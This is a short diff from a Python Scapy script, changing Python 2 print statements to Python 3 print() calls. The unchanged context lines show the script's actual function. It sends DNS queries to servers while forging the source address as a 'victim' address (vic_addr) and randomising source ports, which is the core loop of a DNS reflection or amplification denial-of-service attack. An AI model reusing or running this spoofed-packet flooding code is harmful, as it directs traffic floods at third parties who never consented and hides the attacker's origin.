@@ -48,13 +48,13 @@ def main():
             pkt = pkt /IP(dst=addr, src=vic_addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[b].getlayer(DNS)
             sendp(pkt, iface = iface, verbose=False, socket=socket)
             if i%10 == 1:
-                print "Send %4dst packet, id: %5d"%(i,pkt.getlayer(DNS).id)
+                print("Send %4dst packet, id: %5d"%(i,pkt.getlayer(DNS).id))
             elif i%10 == 2:
-                print "Send %4dnd packet, id: %5d"%(i,pkt.getlayer(DNS).id)
+                print("Send %4dnd packet, id: %5d"%(i,pkt.getlayer(DNS).id))
             elif i%10 == 3:
-                print "Send %4drd packet, id: %5d"%(i,pkt.getlayer(DNS).id)
+                print("Send %4drd packet, id: %5d"%(i,pkt.getlayer(DNS).id))
             else:
-                print "Send %4dth packet, id: %5d"%(i,pkt.getlayer(DNS).id)
+                print("Send %4dth packet, id: %5d"%(i,pkt.getlayer(DNS).id))
             
             time.sleep(a)
     except KeyboardInterrupt:
